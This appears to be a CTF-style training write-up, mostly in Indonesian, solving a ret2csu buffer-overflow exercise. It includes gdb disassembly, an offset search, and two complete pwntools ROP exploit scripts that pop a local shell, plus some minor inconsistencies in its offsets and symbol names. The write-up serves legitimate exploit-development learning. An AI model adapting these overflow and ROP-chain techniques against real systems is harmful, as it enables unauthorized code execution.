---
slug: "pwn-ret2csu"
title: "ret2csu"
competition: "Exercise"
category: "Pwn"
difficulty: "Medium"
date: "2026-08-18"
updated: "2026-08-24"
summary: "Latihan buat persiapan seleksi LKS, isinya ret2csu."
tags: ["PWN","ROP","HANDS-ON","MEDIUM","X64","RET2CSU"]
status: "published"
flag: "SHELL"
attachments: []
source: "https://claritys.web.id/writeups/pwn-ret2csu"
---

# ret2csu

> Latihan buat persiapan seleksi LKS, isinya ret2csu.

Diawal, kita sudah diberi hint bahwa challenge ini itu **ret2csu**. Langsung saja kita checksec.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2csu main* 3m
❯ checksec ret2csu                                                               󰥔 18:33:11
[*] '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2csu/ret2csu'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Luckily, its not stripped, lets check the function.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2csu main*
❯ pwndbg ret2csu                                                                 󰥔 18:33:11
info GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.00ms using Python engine 3.13
pwndbg: loaded 212 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from ret2csu...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.cachyos.org>
  <https://debuginfod.archlinux.org>
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in ret2csu)
gef➤  info fun
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401090  puts@plt
0x00000000004010a0  system@plt
0x00000000004010b0  printf@plt
0x00000000004010c0  gets@plt
0x00000000004010d0  setvbuf@plt
0x00000000004010e0  exit@plt
0x00000000004010f0  _start
0x0000000000401120  _dl_relocate_static_pie
0x0000000000401130  deregister_tm_clones
0x0000000000401160  register_tm_clones
0x00000000004011a0  __do_global_dtors_aux
0x00000000004011d0  frame_dummy
0x00000000004011d6  init
0x000000000040121d  secret
0x000000000040128f  vulnerable
0x00000000004012cc  main
0x0000000000401300  __libc_csu_init
0x0000000000401370  __libc_csu_fini
0x0000000000401378  _fini
```

Because this is my first time solving ret2csu, so i ask a lot to bang Joe and read the solver a lot too.

```
gef➤  disas vulnerable
Dump of assembler code for function vulnerable:
   0x000000000040128f <+0>:     endbr64
   0x0000000000401293 <+4>:     push   rbp
   0x0000000000401294 <+5>:     mov    rbp,rsp
   0x0000000000401297 <+8>:     sub    rsp,0x40
   0x000000000040129b <+12>:    lea    rdi,[rip+0xdc6]        # 0x402068
   0x00000000004012a2 <+19>:    call   0x401090 <puts@plt>
   0x00000000004012a7 <+24>:    lea    rdi,[rip+0xdea]        # 0x402098
   0x00000000004012ae <+31>:    mov    eax,0x0
   0x00000000004012b3 <+36>:    call   0x4010b0 <printf@plt>
   0x00000000004012b8 <+41>:    lea    rax,[rbp-0x40]
   0x00000000004012bc <+45>:    mov    rdi,rax
   0x00000000004012bf <+48>:    mov    eax,0x0
   0x00000000004012c4 <+53>:    call   0x4010c0 <gets@plt>
   0x00000000004012c9 <+58>:    nop
   0x00000000004012ca <+59>:    leave
   0x00000000004012cb <+60>:    ret
End of assembler dump.
gef➤  disas secret
Dump of assembler code for function secret:
   0x000000000040121d <+0>:     endbr64
   0x0000000000401221 <+4>:     push   rbp
   0x0000000000401222 <+5>:     mov    rbp,rsp
   0x0000000000401225 <+8>:     sub    rsp,0x10
   0x0000000000401229 <+12>:    mov    DWORD PTR [rbp-0x4],edi
   0x000000000040122c <+15>:    mov    DWORD PTR [rbp-0x8],esi
   0x000000000040122f <+18>:    mov    DWORD PTR [rbp-0xc],edx
   0x0000000000401232 <+21>:    cmp    DWORD PTR [rbp-0x4],0xdeadbeef
   0x0000000000401239 <+28>:    jne    0x401267 <secret+74>
   0x000000000040123b <+30>:    cmp    DWORD PTR [rbp-0x8],0xcafebabe
   0x0000000000401242 <+37>:    jne    0x401267 <secret+74>
   0x0000000000401244 <+39>:    cmp    DWORD PTR [rbp-0xc],0x1337c0de
   0x000000000040124b <+46>:    jne    0x401267 <secret+74>
   0x000000000040124d <+48>:    lea    rdi,[rip+0xdb4]        # 0x402008
   0x0000000000401254 <+55>:    call   0x401090 <puts@plt>
   0x0000000000401259 <+60>:    lea    rdi,[rip+0xdcf]        # 0x40202f
   0x0000000000401260 <+67>:    call   0x4010a0 <system@plt>
   0x0000000000401265 <+72>:    jmp    0x40128d <secret+112>
   0x0000000000401267 <+74>:    mov    ecx,DWORD PTR [rbp-0xc]
   0x000000000040126a <+77>:    mov    edx,DWORD PTR [rbp-0x8]
   0x000000000040126d <+80>:    mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401270 <+83>:    mov    esi,eax
   0x0000000000401272 <+85>:    lea    rdi,[rip+0xdbf]        # 0x402038
   0x0000000000401279 <+92>:    mov    eax,0x0
   0x000000000040127e <+97>:    call   0x4010b0 <printf@plt>
   0x0000000000401283 <+102>:   mov    edi,0x0
   0x0000000000401288 <+107>:   call   0x4010e0 <exit@plt>
   0x000000000040128d <+112>:   leave
   0x000000000040128e <+113>:   ret
End of assembler dump.
```

Okay, there’s gets. and 0x48 = 72, because its x86, we need 76 for reaching EIP. And now we verification for the offset for the EIP.

```
>>> 0x40
64
>>> 0x40 + 8
72
```

```
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdf80  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
$rbx   : 0x0
$rcx   : 0x00007ffff7e4f760  →  0x0000000000000000
$rdx   : 0x00007ffff7e4f760  →  0x0000000000000000
$rsp   : 0x00007fffffffdfc8  →  "jaaaaaaakaaaaaaalaaaaaaamaaa"
$rbp   : 0x6161616161616169 ("iaaaaaaa"?)
$rsi   : 0x00007ffff7e4d963  →  0xe4f760000000000a ("\n"?)
$rdi   : 0x0
$rip   : 0x00000000004012cb  →  <vulnerable+003c> ret
$r8    : 0x0
$r9    : 0xfbad208b
$r10   : 0x0
$r11   : 0x202
$r12   : 0x1
$r13   : 0x00007fffffffe0f0  →  0x0000000000000001
$r14   : 0x00007ffff7ffd000  →  0x00007ffff7ffe3c0  →  0x0000000000000000
$r15   : 0x00007fffffffe108  →  0x00007fffffffe523  →  "MOZ_ENABLE_WAYLAND=1"
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
──────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdfc8│+0x0000: "jaaaaaaakaaaaaaalaaaaaaamaaa"       ← $rsp
0x00007fffffffdfd0│+0x0008: "kaaaaaaalaaaaaaamaaa"
0x00007fffffffdfd8│+0x0010: "laaaaaaamaaa"
0x00007fffffffdfe0│+0x0018: 0x000000006161616d ("maaa"?)
0x00007fffffffdfe8│+0x0020: 0x00000000004012cc  →  <main+0000> endbr64
0x00007fffffffdff0│+0x0028: 0x00000001f7fe1bf0
0x00007fffffffdff8│+0x0030: 0x00007fffffffe0f8  →  0x00007fffffffe4c9  →  "/home/claritys/ctf/pwncheatsheet/learnfromLKS/Bina[...]"
0x00007fffffffe000│+0x0038: 0x0000000000400040  →   (bad)
────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4012c4 <vulnerable+0035> call   0x4010c0 <gets@plt>
     0x4012c9 <vulnerable+003a> nop
     0x4012ca <vulnerable+003b> leave
 →   0x4012cb <vulnerable+003c> ret
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2csu", stopped 0x4012cb in vulnerable (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4012cb → vulnerable()
───────────────────────────────────────────────────────────────────────────────────────────
gef➤  cyclic -l jaaaaaaa
Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)
Found at offset 72
```

Okay, jadi ret2csu itu little bit special. Karena dia ini pada dasarnya adalah mengisi atau mengadakan gadget ROP, seperti pop rdi, pop rsi, pop rbx, dll. Jadi oleh karena itu dia ada libc csu sendiri, yang kita bisa jump ke sana lalu ngewrite value apa yang kita inginkan dari yang disediain csu ini.

```
gef➤  disas __libc_csu_init
Dump of assembler code for function __libc_csu_init:
   0x0000000000401300 <+0>:     endbr64
   0x0000000000401304 <+4>:     push   r15
   0x0000000000401306 <+6>:     lea    r15,[rip+0x2b03]        # 0x403e10
   0x000000000040130d <+13>:    push   r14
   0x000000000040130f <+15>:    mov    r14,rdx
   0x0000000000401312 <+18>:    push   r13
   0x0000000000401314 <+20>:    mov    r13,rsi
   0x0000000000401317 <+23>:    push   r12
   0x0000000000401319 <+25>:    mov    r12d,edi
   0x000000000040131c <+28>:    push   rbp
   0x000000000040131d <+29>:    lea    rbp,[rip+0x2af4]        # 0x403e18
   0x0000000000401324 <+36>:    push   rbx
   0x0000000000401325 <+37>:    sub    rbp,r15
   0x0000000000401328 <+40>:    sub    rsp,0x8
   0x000000000040132c <+44>:    call   0x401000 <_init>
   0x0000000000401331 <+49>:    sar    rbp,0x3
   0x0000000000401335 <+53>:    je     0x401356 <__libc_csu_init+86>
   0x0000000000401337 <+55>:    xor    ebx,ebx
   0x0000000000401339 <+57>:    nop    DWORD PTR [rax+0x0]
   0x0000000000401340 <+64>:    mov    rdx,r14
   0x0000000000401343 <+67>:    mov    rsi,r13
   0x0000000000401346 <+70>:    mov    edi,r12d
   0x0000000000401349 <+73>:    call   QWORD PTR [r15+rbx*8]
   0x000000000040134d <+77>:    add    rbx,0x1
   0x0000000000401351 <+81>:    cmp    rbp,rbx
   0x0000000000401354 <+84>:    jne    0x401340 <__libc_csu_init+64>
   0x0000000000401356 <+86>:    add    rsp,0x8
   0x000000000040135a <+90>:    pop    rbx
   0x000000000040135b <+91>:    pop    rbp
   0x000000000040135c <+92>:    pop    r12
   0x000000000040135e <+94>:    pop    r13
   0x0000000000401360 <+96>:    pop    r14
   0x0000000000401362 <+98>:    pop    r15
   0x0000000000401364 <+100>:   ret
End of assembler dump.
```

Nah, seperti yang bisa kita lihat, di situ ada banyak sekali pop diakhir. Jadi kita bisa memanfaatkan pop yang udah disediain sama csu mengisi yang kita inginkan.

Jadi ya alurnya kita ret dulu, lalu kita ke address `0x40135a` biar nanti kita bisa langsung mengisi gadget yang kita inginkan.

```
 gef➤  disas secret
Dump of assembler code for function secret:
   0x000000000040121d <+0>:     endbr64
   0x0000000000401221 <+4>:     push   rbp
   0x0000000000401222 <+5>:     mov    rbp,rsp
   0x0000000000401225 <+8>:     sub    rsp,0x10
   0x0000000000401229 <+12>:    mov    DWORD PTR [rbp-0x4],edi
   0x000000000040122c <+15>:    mov    DWORD PTR [rbp-0x8],esi
   0x000000000040122f <+18>:    mov    DWORD PTR [rbp-0xc],edx
   0x0000000000401232 <+21>:    cmp    DWORD PTR [rbp-0x4],0xdeadbeef
   0x0000000000401239 <+28>:    jne    0x401267 <secret+74>
   0x000000000040123b <+30>:    cmp    DWORD PTR [rbp-0x8],0xcafebabe
   0x0000000000401242 <+37>:    jne    0x401267 <secret+74>
   0x0000000000401244 <+39>:    cmp    DWORD PTR [rbp-0xc],0x1337c0de
   0x000000000040124b <+46>:    jne    0x401267 <secret+74>
   0x000000000040124d <+48>:    lea    rdi,[rip+0xdb4]        # 0x402008
   0x0000000000401254 <+55>:    call   0x401090 <puts@plt>
   0x0000000000401259 <+60>:    lea    rdi,[rip+0xdcf]        # 0x40202f
   0x0000000000401260 <+67>:    call   0x4010a0 <system@plt>
   0x0000000000401265 <+72>:    jmp    0x40128d <secret+112>
   0x0000000000401267 <+74>:    mov    ecx,DWORD PTR [rbp-0xc]
   0x000000000040126a <+77>:    mov    edx,DWORD PTR [rbp-0x8]
   0x000000000040126d <+80>:    mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401270 <+83>:    mov    esi,eax
   0x0000000000401272 <+85>:    lea    rdi,[rip+0xdbf]        # 0x402038
   0x0000000000401279 <+92>:    mov    eax,0x0
   0x000000000040127e <+97>:    call   0x4010b0 <printf@plt>
   0x0000000000401283 <+102>:   mov    edi,0x0
   0x0000000000401288 <+107>:   call   0x4010e0 <exit@plt>
   0x000000000040128d <+112>:   leave
   0x000000000040128e <+113>:   ret
End of assembler dump.
```

Dari situ, dapat kita lihat kalau kita harus memenuhi `0xdeadbeef, 0xcafebabe, dan 0x1337c0de` biar nanti bisa berhasil melewati secret. Nah sekarang membuat scriptnya.

Jadi awalnya itu kita jump ke address `0x40135a` buat mengisi apa yang kita perlukan.

```
   0x000000000040135a <+90>:    pop    rbx
   0x000000000040135b <+91>:    pop    rbp
   0x000000000040135c <+92>:    pop    r12
   0x000000000040135e <+94>:    pop    r13
   0x0000000000401360 <+96>:    pop    r14
   0x0000000000401362 <+98>:    pop    r15
   0x0000000000401364 <+100>:   ret
```

Nah, alasanku memilih mulai dari RBP dapat dilihat dari snippet ini:

```
   0x000000000040134d <+77>:    add    rbx,0x1
   0x0000000000401351 <+81>:    cmp    rbp,rbx
   0x0000000000401354 <+84>:    jne    0x401340 <__libc_csu_init+64>
```

Jadi, kita harus menyamakan value dari rbp dan rbx biar nanti dia gak infinity looping gitu, dikarenakan nanti rbx sudah otomatis ditambah `0x1`, kita tinggal menyamakan dengan rbp jadi kita masukkan nilai 1 ke rbp.

### 1\. Aturan Main CPU: Linux x86\_64 Calling Convention

Pada arsitektur Linux 64-bit (spesifiknya _System V AMD64 ABI_), CPU **tidak pernah** membaca argumen fungsi secara asal dari sembarang register. CPU punya aturan tegas:

-   **Argumen ke-1** fungsi **WAJIB** berada di register `RDI` (atau `EDI`)
    

-   **Argumen ke-2** fungsi **WAJIB** berada di register `RSI`
    

-   **Argumen ke-3** fungsi **WAJIB** berada di register `RDX`
    

Nah, karena aturan itu, kita membutuhkan mov yang di mana memindahkan value yang kita tadi masukkin itu bisa ke apply ke register yang dibutuhkan sesuai urutan.

Kebetulan, di csu ini juga udah disedian sama persis apa yang kita butuhkan, yaitu:

```
   0x0000000000401340 <+64>:    mov    rdx,r14
   0x0000000000401343 <+67>:    mov    rsi,r13
   0x0000000000401346 <+70>:    mov    edi,r12d
```

Jadinya ya kita tinggal balik kembali ke sana, tapi dengan catatan, nanti itu ada juga pop yang telah kita lakukan tadi, jadinya kita isi dummy aja biar enak.

My own solver: (actually I’m using template from pwninit and then i modifed it a bit for my own environment)

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("ret2csu_patched")

exe = context.binary
context.terminal = ["ghostty", "-e"]
context.arch = 'amd64'

gdbscript = """
set pagination off
set confirm off

break main
continue
"""

def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r

    if args.LOCAL:
        return process([elf.path])

    return remote("addr", 1337)

def main():
    r = conn()
    win_ptr = elf.sym['target_func'] #0x404080
    payload = flat(
        b'A' * 72,
        0x000000000040101a, #ret
        0x000000000040135a, #csu yang +90
        0, 
        1, #RBP = 1 (biar CMP RBP, RBX sama setelah ADD RBX, 1) karena kan ada      0x000000000040134d <+77>:    add    rbx,0x1
        0xdeadbeef,                                                                            #0x0000000000401351 <+81>:    cmp    rbp,rbx
        0xcafebabe,                                                                            #jadinya nanti dia gak ngeloop sampe rbp nya itu valid kek biasa.
        0x1337c0de,
        win_ptr, #WIN
        0x0000000000401340,
        # --- PADDING / DUMMY SETELAH CSU FRONT (TOTAL 7 SLOT = 56 BYTE) ---
        0,           # Slot 1: Dilewati oleh 'add rsp, 0x8' (8 byte) #karena kita tadi emang sudah ada space buat rsp buat ngisi kita return, jadi ini kita kosongin.
        0,           # Slot 2: Diambil oleh 'pop rbx'        (8 byte)
        0,           # Slot 3: Diambil oleh 'pop rbp'        (8 byte)
        0,           # Slot 4: Diambil oleh 'pop r12'        (8 byte)
        0,           # Slot 5: Diambil oleh 'pop r13'        (8 byte)
        0,           # Slot 6: Diambil oleh 'pop r14'        (8 byte)
        0            # Slot 7: Diambil oleh 'pop r15'        (8 byte)
    )
    # good luck pwning :)
    r.sendlineafter(b'>', payload)
    r.interactive()

if __name__ == "__main__":
    main()
```

Nah, aku ini menanyakan AI Gemini (karena tidak belum filtering) buat penjelasan lebih detail. Bisa dilihat chatku di sini:

[https://share.gemini.google/s0Q8Dp8DbEJX](https://share.gemini.google/s0Q8Dp8DbEJX)

Solver resmi dari latihan LKS nya adalah:

```python
from pwn import *

elf = context.binary = ELF('./ret2csu')
p = process()

csu_end = elf.sym['__libc_csu_init'] + 90
csu_front = elf.sym['__libc_csu_init'] + 64

win_ptr = elf.sym['target_func']

rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]

offset = 72

payload = flat(
    b'A' * offset,
    ret,
    csu_end,
    0,
    1,
    0xdeadbeef,
    0xcafebabe,
    0x1337c0de,
    win_ptr,

    csu_front,

    0, 0, 0, 0, 0, 0, 0

)

p.sendlineafter(b'>', payload)
p.interactive()
```

Ini aku bener bener ngeliat solver ini terus terusan juga, jadi ya lowkey aku sedih 😭

**Implement:**

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2csu main*
❯ python3 solve.py LOCAL                                                         󰥔 19:25:56
[*] '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2csu/ret2csu_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[x] Starting local process '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Ha[.] Starting local process '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Ha[+] on/ROP/ret2csu/ret2csu_patched': pid 233389
[*] Switching to interactive mode

Lylera: Selamatt. Nih ku kasih hadiah
$ ls
csu.zip  notes.txt  ret2csu  ret2csu.c  ret2csu_patched  ret2csu.py  solve.py
```
